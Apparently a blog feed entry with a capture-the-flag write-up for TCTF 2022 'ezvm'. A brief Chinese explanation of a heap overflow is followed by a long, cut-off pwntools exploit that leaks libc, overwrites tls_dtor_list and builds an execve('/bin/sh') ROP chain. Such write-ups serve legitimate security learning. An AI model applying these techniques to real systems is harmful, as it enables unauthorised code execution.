{
    "version": "https://jsonfeed.org/version/1",
    "title": "我他喵的 • All posts by \"pwn\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/09/20/tctf2022ezvm/",
            "url": "http://example.com/2022/09/20/tctf2022ezvm/",
            "title": "tctf2022ezvm",
            "date_published": "2022-09-20T06:08:33.000Z",
            "content_html": "<h3 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路</h3>\n<p>在申请 memery 的时候存在整数溢出，程序虽然会检测到，但是允许我们进行一次的整数溢出申请，这样实际的 memery 的 count 很大，但是 chunk 的大小远小于这个值，造成了堆块的越界读写。<br>\n当我们申请一个很大的堆块，会在 libc 附近分配，配合越界写，我们就可以修改 tls_dtor_list, 以及 secret 的值。<br>\nchunk 的释放冲 i 性能申请没有对其进行清空，所以，我们申请出一个 largebin 范围的 chunk，然后释放，这样再次将其申请出来的时候，在 memery [1] 会存有一个指针，就可以知道 libc 的及地址了。将这个数据存在这个 chunk+0x1d0 附近，在这里写一些数据，拼接出 mov_r_i 的指令，以及一个 jmp 到低地址的指令 释放。然后我们我们这次的时候，codesize 为 0x200, 就会将刚写进去的拼接指令，放到 code 的靠后的位置，我们只需要在 code 的最开始写一个 jmp，让 vm 跳到我们刚写的拼接指令哪里，将 libc 的放入寄存器。同时这一次的 memerycount 要发生溢出，并且在 libc 附近申请到一个 chunk. 这样根据偏移量，结合程序的一些基本运算，就得到了函数地址，gadget 地址。然后修改 tls_dtor_list 到 heap 上，并在哪里填充 rop, 以及修改 searet 的值。最后触发程序错误，直接 exit，getshell</p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#r=process(&#x27;./ezvm&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;202.120.7.210&#x27;</span>,<span class=\"number\">40241</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">code =<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push</span>(<span class=\"params\">rig</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">0</span>)+p8(rig)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pop</span>(<span class=\"params\">rig</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">1</span>)+p8(rig)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sub</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">imul</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">div</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">yu</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">left</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">7</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">right</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">And</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Or</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">judge0</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jmp</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">14</span>)+p64(address)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jnz</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">15</span>)+p64(address)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jz</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">16</span>)+p64(address)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmpequ</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">17</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmpsml</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">18</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmpbig</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">19</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mov_r_i</span>(<span class=\"params\">rig,num</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode+=p8(<span class=\"number\">20</span>)+p8(rig)+p64(num)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mov_m_r</span>(<span class=\"params\">rig,offset</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">21</span>)+p8(rig)+p64(offset)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mov_r_m</span>(<span class=\"params\">rig,offset</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode +=p8(<span class=\"number\">22</span>)+p8(rig)+p64(offset)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">clear</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> code</span><br><span class=\"line\">\tcode = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\">#size(stack) = 0x800 ====&gt;we can use it to save 0x100 nums</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">runcode</span>(<span class=\"params\">code,code_size,mem_size</span>):</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Please input your code size:&quot;</span>,<span class=\"built_in\">str</span>(code_size))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Please input your memory count:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">int</span>(mem_size/<span class=\"number\">8</span>)))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Please input your code:&quot;</span>,code)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_i(<span class=\"number\">0</span>,<span class=\"number\">0x111111</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x222222</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">2</span>,<span class=\"number\">0x333333</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">3</span>,<span class=\"number\">0x444444</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\">push(<span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(code))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Welcome to 0ctf2022!!&quot;</span>,<span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">runcode(code,<span class=\"number\">0xf0</span>,<span class=\"number\">0x600</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x000001582&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">clear()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak the libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_m(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_m(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x219ce0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x219ce0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\">push(<span class=\"number\">3</span>)</span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">sub()</span><br><span class=\"line\">pop(<span class=\"number\">0</span>)<span class=\"comment\">#put libc into heap</span></span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x14000000000000</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">1</span>,<span class=\"number\">0x3a</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">0</span>,<span class=\"number\">0x3b</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0xfffffffffffe700e</span>)<span class=\"comment\">#jmp</span></span><br><span class=\"line\">mov_m_r(<span class=\"number\">1</span>,<span class=\"number\">0x3c</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">2</span>,<span class=\"number\">0xffff</span>)<span class=\"comment\">#addr</span></span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,<span class=\"number\">0x3d</span>-<span class=\"number\">0xa</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(code))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;continue&quot;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">runcode(code,<span class=\"number\">0xf0</span>,<span class=\"number\">0x600</span>)</span><br><span class=\"line\">clear()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#we have the libc in mem</span></span><br><span class=\"line\">tls_offset = <span class=\"number\">0x0028c0</span>  <span class=\"comment\">#libc - </span></span><br><span class=\"line\">tls_dtor_list_offset = <span class=\"number\">0x0416d8</span><span class=\"comment\">#libc-</span></span><br><span class=\"line\">secret_offset = <span class=\"number\">0x0028c0</span>-<span class=\"number\">0x30</span></span><br><span class=\"line\">heap_offset = <span class=\"number\">0x43ff0</span></span><br><span class=\"line\">sec_heap_offset = <span class=\"number\">0x0082ec</span></span><br><span class=\"line\">tls_dtor_list_heap_offset = <span class=\"number\">0x0082bb</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"><span class=\"comment\">#code3 we need to malloc  a big one</span></span><br><span class=\"line\"></span><br><span class=\"line\">jmp(<span class=\"number\">0x000186</span>-<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">0</span>,<span class=\"number\">0</span>)\t<span class=\"comment\">#memery[0]  ==libc</span></span><br><span class=\"line\"><span class=\"comment\"># mov_r_i(1,secret_offset)</span></span><br><span class=\"line\"><span class=\"comment\"># push(1)</span></span><br><span class=\"line\"><span class=\"comment\"># sub()</span></span><br><span class=\"line\"><span class=\"comment\"># pop(2)</span></span><br><span class=\"line\"><span class=\"comment\"># mov_m_r(2,1)\t#memery[1] = secret_address</span></span><br><span class=\"line\">sec = <span class=\"number\">0x5143329d0ccc697</span></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,sec)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">1</span>,sec_heap_offset)\t<span class=\"comment\">#secret = 0xcafebabedeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pos_offset = <span class=\"built_in\">int</span>(<span class=\"number\">0x100</span>/<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#read rop to che chunk </span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;rop</span></span><br><span class=\"line\"><span class=\"string\">leave_ret = libc + 0x000562ec</span></span><br><span class=\"line\"><span class=\"string\">prdi = libc + 0x002a3e5</span></span><br><span class=\"line\"><span class=\"string\">prsi = libc + 0x02be51</span></span><br><span class=\"line\"><span class=\"string\">prdx_pr12 = libc +0x011f497</span></span><br><span class=\"line\"><span class=\"string\">binsh = libc + 0x001d8698</span></span><br><span class=\"line\"><span class=\"string\">execve = libc + 0xeb0f0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">addr = ((leave_ret^sec)&lt;&lt;0x11)&amp;0xffffffffffff8000</span></span><br><span class=\"line\"><span class=\"string\">addr += ((leave_ret^sec)&gt;&gt;0x2f)&amp;0x7fff</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">rop = p64(prdi) + p64(binsh)</span></span><br><span class=\"line\"><span class=\"string\">rop += p64(prsi) + p64(0)</span></span><br><span class=\"line\"><span class=\"string\">rop += p64(prdx_pr12) + p64(0)*2</span></span><br><span class=\"line\"><span class=\"string\">rop += p64(execve)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">leave_ret =  <span class=\"number\">0x000562ec</span></span><br><span class=\"line\">prdi =  <span class=\"number\">0x002a3e5</span></span><br><span class=\"line\">prsi =  <span class=\"number\">0x02be51</span></span><br><span class=\"line\">prdx_pr12 = <span class=\"number\">0x011f497</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x001d8698</span></span><br><span class=\"line\">execve =  <span class=\"number\">0xeb0f0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#write leave ret</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,leave_ret)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,sec)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">xor()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">push(<span class=\"number\">2</span>)\t\t<span class=\"comment\">#2 xor save</span></span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x11</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">left()</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0xffffffffffff8000</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">And()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)\t\t<span class=\"comment\">#addr lef</span></span><br><span class=\"line\">pop(<span class=\"number\">3</span>)\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">3</span>)\t\t<span class=\"comment\">#xor res</span></span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x2f</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">right()</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,<span class=\"number\">0x7fff</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">And()</span><br><span class=\"line\">push(<span class=\"number\">2</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)\t\t\t\t<span class=\"comment\">#leave_ret_encrept</span></span><br><span class=\"line\"></span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pop _rdi</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,prdi)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#binsh</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,binsh)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pop rsi</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,prsi)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0</span></span><br><span class=\"line\">pos_offset+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#prdx 0 0</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,prdx_pr12)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\">pos_offset+=<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#execve</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,execve)</span><br><span 